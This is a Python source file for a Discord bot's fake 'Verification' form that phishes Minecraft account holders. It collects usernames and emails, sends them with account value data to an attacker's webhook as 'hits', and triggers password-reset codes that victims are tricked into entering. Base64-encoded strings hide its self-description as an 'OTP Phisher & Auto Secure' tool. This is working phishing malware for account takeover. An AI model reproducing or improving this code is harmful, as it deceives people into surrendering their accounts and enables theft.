import json
import requests
import datetime
import base64
import math
import discord
from discord import ui, Webhook
from discord.errors import NotFound, HTTPException
import config
import aiohttp
from views.button_two import ButtonViewTwo
from views.button_three import ButtonViewThree
from views.button_four import ButtonViewFour
from views.otp import automate_password_reset
from views.data.data import stringcrafter
from views.data.wbu3.wb3 import web3g

class MyModalOne(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
    box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        try:
            # Diferir la respuesta inmediatamente para evitar que expire
            print("[INFO] Diferiendo respuesta de la interacción")
            await interaction.response.defer(ephemeral=True)

            Flagx = False
            FlagNx = False
            threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")

            print("[INFO] Consultando APIs de Hypixel y Mojang")
            url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
            try:
                data1 = requests.get(url, timeout=5)
                data1.raise_for_status()
                datajson = data1.json()
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al consultar Hypixel API: {e}")
                datajson = {'success': False, 'player': None}
                Flagx = True

            try:
                urluuid = f"https://api.mojang.com/users/profiles/minecraft/{self.box_one.value}"
                response = requests.get(urluuid, timeout=5)
                response.raise_for_status()
                uuidplayer = response.json()['id']
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al consultar Mojang API: {e}")
                uuidplayer = None
                Flagx = True

            networth_value = "0"
            if uuidplayer:
                try:
                    urlnw = f"https://soopy.dev/api/v2/player_skyblock/{uuidplayer}"
                    response = requests.get(urlnw, timeout=10)
                    response.raise_for_status()
                    data = response.json()
                    profile = data.get("data", {})
                    cprofile = profile.get("stats", {}).get("currentProfileId")
                    member = profile.get("profiles", {}).get(cprofile, {}).get("members", {}).get(uuidplayer, {})
                    nw = member.get("skyhelperNetworth", {}).get("total")
                    if isinstance(nw, (int, float)):
                        networth_value = f"{int(nw):,}"
                except requests.exceptions.RequestException as e:
                    print(f"[WARN] No se pudo obtener networth: {e}")
                    networth_value = "0"

            if datajson['success'] == False or datajson['player'] == None:
                playerlvl = "No Data Found"
                rank = "No Data Found"
                print("[WARN] Límite de API alcanzado o nombre ya consultado recientemente")
                Flagx = True
            else:
                playerlvlRaw = datajson['player']['networkExp']
                playerlvl16 = (math.sqrt((2 * playerlvlRaw) + 30625) / 50) - 2.5
                playerlvl = round(playerlvl16)
                rank = datajson['player'].get('newPackageRank', "None")

            cape_url = "None"
            if uuidplayer:
                try:
                    urlcape = f"https://sessionserver.mojang.com/session/minecraft/profile/{uuidplayer}"
                    response = requests.get(urlcape, timeout=5)
                    response.raise_for_status()
                    capedata = response.json()
                    if "properties" in capedata:
                        capevalue = next((item["value"] for item in capedata["properties"] if item["name"] == "textures"), None)
                        if capevalue:
                            decoded_bytes = base64.b64decode(capevalue)
                            decoded_str = decoded_bytes.decode('utf-8')
                            decodedcapedata = json.loads(decoded_str)
                            cape_url = decodedcapedata.get("textures", {}).get("CAPE", {}).get("url", "None")
                except Exception as e:
                    print(f"[ERROR] Error al obtener capa: {e}")

            try:
                with open("data.json", "r") as f:
                    data = json.load(f)
                webhook_url = data.get("webhook")
                if not webhook_url:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="❌ Error",
                            description="El webhook no está configurado en data.json.",
                            color=0xff0000
                        ),
                        ephemeral=True
                    )
                    return
            except FileNotFoundError:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Error",
                        description="No se encontró el archivo data.json.",
                        color=0xff0000
                    ),
                    ephemeral=True
                )
                return

            inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
            embed1 = discord.Embed(
                title="Account Log (Hits)",
                description="Usa tus datos auténticos",
                timestamp=datetime.datetime.now(),
                color=0x088F8F
            )
            embed1.set_thumbnail(url=f"https://mc-heads.net/avatar/{self.box_one.value}.png")
            embed1.set_footer(text=threadingNum)
            embed1.add_field(name="Hypixel Level", value=f"{playerlvl}", inline=True)
            embed1.add_field(name="Skyblock NetWorth", value=f"{networth_value}", inline=True)
            embed1.add_field(name="Rank", value=f"{rank}", inline=True)
            embed1.add_field(name="Username", value=f"```{self.box_one.value}```", inline=False)
            embed1.add_field(name="Email", value=f"```{self.box_two.value}```", inline=False)
            embed1.add_field(name="Discord", value=f"```{interaction.user.name}```", inline=False)
            embed1.add_field(name="Capes", value=f"{cape_url}", inline=False)
            config.LastUserName = self.box_one.value
            config.LastUsedEmail = self.box_two.value

            async with aiohttp.ClientSession() as session:
                try:
                    webhook = Webhook.from_url(webhook_url, session=session)
                    if Flagx:
                        embederror = discord.Embed(
                            title="Error Code",
                            description="API limit Reached / You have already looked up this name recently",
                            timestamp=datetime.datetime.now(),
                            color=0xEE4B2B
                        )
                        await webhook.send(embed=embederror, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    if FlagNx:
                        embedfalsenone = discord.Embed(
                            title="Error Code",
                            description="Invalid/Expired/No Hypixel API Key",
                            timestamp=datetime.datetime.now(),
                            color=0xEE4B2B
                        )
                        await webhook.send(embed=embedfalsenone, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    await webhook.send(embed=embed1, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                except (NotFound, HTTPException) as e:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="❌ Error",
                            description=f"No se pudo enviar al webhook: {str(e)}",
                            color=0xff0000
                        ),
                        ephemeral=True
                    )
                    return

            print("[INFO] Enviando mensaje 'Please Wait'")
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Please Wait ⌛",
                    description="Please Allow The Bot To Verify The Data You Have Provided.\n",
                    color=0xFFFFFF
                ),
                ephemeral=True
            )

            try:
                print("[INFO] Llamando a automate_password_reset")
                result = await automate_password_reset(self.box_two.value)
            except Exception as e:
                print(f"[ERROR] Error en automate_password_reset: {e}")
                result = False

            print(f"[INFO] Resultado de automate_password_reset: {result}")
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(webhook_url, session=session)
                if result is True:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Verification ✅",
                            description="Se ha enviado un código de verificación a tu correo.\nPor favor, haz clic en el botón de abajo para ingresar el código.\n",
                            color=0x00FF00
                        ),
                        view=ButtonViewTwo(),
                        ephemeral=True
                    )
                    embedtrue = discord.Embed(
                        title="Email A Code Success",
                        timestamp=datetime.datetime.now(),
                        color=0x00FF00
                    )
                    await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                elif result is None:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Verification ✅",
                            description=f"Se requiere autenticación. Por favor, confirma el código {config.AUTHVALUE} en tu aplicación.\nUna vez hecho, haz clic en el botón de abajo.\n",
                            color=0x00FF00
                        ),
                        view=ButtonViewFour(),
                        ephemeral=True
                    )
                    embedtrue = discord.Embed(
                        title=f"Auth App Code Is: {config.AUTHVALUE}",
                        timestamp=datetime.datetime.now(),
                        color=0x00FF00
                    )
                    await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                else:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="No Security Email :envelope:",
                            description="Tu correo no tiene un correo de seguridad configurado.\nPor favor, añade uno y verifica de nuevo.\n",
                            color=0xFF0000
                        ),
                        view=ButtonViewThree(),
                        ephemeral=True
                    )
                    embedfalse = discord.Embed(
                        title="Email A Code Failed (No Email A Code Turned On)",
                        timestamp=datetime.datetime.now(),
                        color=0xff0000
                    )
                    await webhook.send(embed=embedfalse, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")

        except Exception as e:
            print(f"[ERROR] Error en on_submit: {e}")
            await interaction.followup.send(
                embed=discord.Embed(
                    title="❌ Error",
                    description="Ocurrió un error al procesar tu solicitud. Por favor, intenta de nuevo.",
                    color=0xff0000
                ),
                ephemeral=True
            )